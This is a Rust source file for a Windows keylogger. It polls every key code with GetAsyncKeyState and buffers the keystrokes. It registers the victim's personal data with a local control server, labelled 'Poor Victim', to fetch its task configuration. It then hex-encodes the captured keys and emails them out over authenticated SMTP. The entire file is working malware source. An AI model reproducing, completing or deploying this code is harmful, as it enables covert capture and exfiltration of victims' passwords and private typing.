use std::{thread, time};
use lettre::message::header::ContentType;
use lettre::{SmtpTransport, Transport};
use lettre::transport::smtp::authentication::Credentials;
use log::debug;
use tokio::net::windows::named_pipe::PipeMode::Message;
use windows::UI::Core::CoreVirtualKeyStates;
use windows::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;
use std::fmt::Write;
use reqwest::Url;
use serde_json::value::Index;
use prosty_keylogger::common::{Gender, MailConfiguration, PersonalData, ReportConfig, TaskConfiguration};
//CoreVirtualKeyStates

//pub const BUFF_SIZE: usize = 1024*128;
#[inline]
pub fn check_key() -> Vec<u8>{
    let mut v = Vec::with_capacity(8);
    for i in 0..255u8{
        unsafe{
            let state = GetAsyncKeyState(i as i32);
            if state == 1 || state ==  -32767{
                v.push(i)
            }
        }

    }
    v
}

fn send_mail(num: u32, values: Vec<u8>, config: &MailConfiguration, id: u64){
    let mut body: String = String::with_capacity(values.len() as usize *2 + 64);
    for v in values{
        write!(body, "{:02x}", v).unwrap();
    }

    let email = lettre::Message::builder()
        .from(config.mail_from.parse().unwrap())
        .to(config.mail_to.parse().unwrap())
        .subject(format!("R-{id:016x}-{}", num))
        .header(ContentType::TEXT_PLAIN)
        .body(body)
        .unwrap();
    let creds = Credentials::new(config.smtp_login.to_owned(), config.smtp_password.to_owned());

    let mailer = SmtpTransport::relay(&config.relay)
        .unwrap()
        .credentials(creds)
        .build();

    match mailer.send(&email){
        Ok(_) => {
            println!("Email sent successfully")
        }
        Err(e) => {
            println!("Could not send mail: {e:}")
        }
    }
}


fn send_report(num: u32, values: Vec<u8>, config: &TaskConfiguration) -> Result<(), anyhow::Error>{
    match config.report_config{
        ReportConfig::Mail(ref mail) => {send_mail(num, values, mail, config.id)}
    }
    Ok(())
}
async fn get_config(url: Url, personal_data: Option<&PersonalData>) -> Result<TaskConfiguration, anyhow::Error>{
    let s = match personal_data{
        None => reqwest::get(url).await?.text().await?,
        Some(data) => {
            let client = reqwest::Client::new();
            let json = serde_json::to_string(&data)?;
            client.post(url.join("/hello")?).json(&data).send().await?.text().await?
        }
    };
    let t: TaskConfiguration = serde_json::from_str(&s)?;
    Ok(t)
}

//#[tokio::main]
fn main()  -> Result<(), anyhow::Error>{
    let rt = tokio::runtime::Runtime::new()?;

    let data = PersonalData{
        name: Some("Poor".into()),
        last_name: Some("Victim".into()),
        gender: Some(Gender::Male),
    };


    let config = rt.block_on(async{
        //let config = get_config(Url::parse("http://127.0.0.1:8080/")?).await?;
        let config = get_config(Url::parse("http://127.0.0.1:8080")?, Some(&data)).await?;
        return Ok::<TaskConfiguration, anyhow::Error>(config);

    })?;

    println!("{:?}", config);
    let milli = time::Duration::from_millis(config.probe_interval_milli as u64);
    let mut vec = Vec::with_capacity(config.capture_size as usize + 64);
    let mut num =1;

    loop{
        thread::sleep(milli);
        let mut keys = check_key();

        if !keys.is_empty(){
            println!("{:02x?}", keys);
            vec.extend(keys);
            println!("len = {}", vec.len());
        }


        if vec.len() > config.capture_size as usize {
            let mut send_vec = Vec::with_capacity(config.capture_size as usize + 64);
            std::mem::swap(&mut send_vec, &mut vec);
            send_report(num, send_vec, &config)?;
            num += 1;
        }

    }
}
